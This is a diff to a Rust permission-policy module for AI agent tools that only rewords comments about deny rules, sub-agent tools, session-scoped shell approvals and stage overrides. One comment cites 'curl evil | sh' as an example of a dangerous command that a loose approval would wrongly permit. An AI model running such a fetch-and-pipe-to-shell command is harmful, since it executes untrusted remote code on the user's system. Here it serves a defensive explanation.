@@ -211,17 +211,18 @@ pub fn default_tool_policy(tool_name: &str, is_builtin: bool) -> ToolPolicy {
         // The sub-agent tools default to `Allow`, and the point of routing them
         // through this function at all is the *config*, not the prompt.
         //
-        // They used to skip policy resolution entirely, so a user's
-        // `[tool_permissions] spawn_agent = "deny"` was silently ignored - the
-        // "a configured deny is terminal" guarantee did not cover these five
-        // names. That is the hole worth closing, and it is closed by being here.
+        // If they skipped policy resolution entirely, a user's
+        // `[tool_permissions] spawn_agent = "deny"` would be silently ignored -
+        // the "a configured deny is terminal" guarantee would not cover these
+        // five names. That is the hole worth closing, and it is closed by being
+        // here.
         //
         // Defaulting them to `Ask` instead would change what working agents do:
         // every fan-out would stop on a prompt, and an unattended run would
         // block on an approval nothing is there to give. `spawn_agent` can only
         // name an agent the user installed, the tree is depth-capped, and
-        // children inherit `--no-seed-commands`, so the default keeps the
-        // behaviour that existed while making the user's own setting count. Set
+        // children inherit `--no-seed-commands`, so the `Allow` default keeps
+        // working agents working while making the user's own setting count. Set
         // `spawn_agent = "ask"` to be prompted.
         "spawn_agent" | "check_agent" | "wait_for_agent" | "send_to_agent" | "kill_agent" => {
             ToolPolicy::Allow
@@ -322,10 +323,10 @@ pub fn resolve_policy(
 /// The keys a session-scoped approval ("allow for this session") is remembered
 /// under. Empty means this call must not be session-granted at all.
 ///
-/// Session approval used to key on the bare tool name, so approving one `shell`
-/// call approved *every* later `shell` call for the run. "Allow `ls` for this
-/// session" silently became "allow `curl evil | sh` for this session" - the user
-/// consented to one thing and granted another.
+/// Keying session approval on the bare tool name would make approving one
+/// `shell` call approve *every* later `shell` call for the run. "Allow `ls` for
+/// this session" silently becomes "allow `curl evil | sh` for this session" -
+/// the user consents to one thing and grants another.
 ///
 /// So a shell approval is keyed on what actually runs: for each command in the
 /// line, its leading words. `git diff HEAD~1` grants `git diff`,
@@ -842,9 +843,9 @@ mod policy_tests {
 
     /// ...but it may NOT loosen it. `agent.leviath` is a file the user
     /// downloaded; letting its `[stages.x.tool_permissions]` overrule the user's
-    /// own `[tool_permissions]` meant an installed agent could self-grant the
-    /// shell the user had explicitly denied. (This test previously asserted the
-    /// opposite - that stage "beats" global - which is the bug, not the design.)
+    /// own `[tool_permissions]` would let an installed agent self-grant the
+    /// shell the user had explicitly denied. (A test asserting the opposite -
+    /// that stage "beats" global - codifies the bug, not the design.)
     #[test]
     fn test_resolve_policy_stage_cannot_loosen_global() {
         let mut stage = HashMap::new();
@@ -1614,8 +1615,8 @@ mod policy_tests {
     // ─── resolve_policy full chain: all four levels present ───────────────
 
     /// With every level saying `deny`, nothing lifts it - not the stage, not the
-    /// agent, not `--allow`. Previously this asserted `Allow`, i.e. that a launch
-    /// flag beat a unanimous deny.
+    /// agent, not `--allow`. Asserting `Allow` here would mean a launch flag
+    /// beats a unanimous deny.
     #[test]
     fn test_resolve_policy_full_chain_deny_is_terminal() {
         let mut launch = HashMap::new();
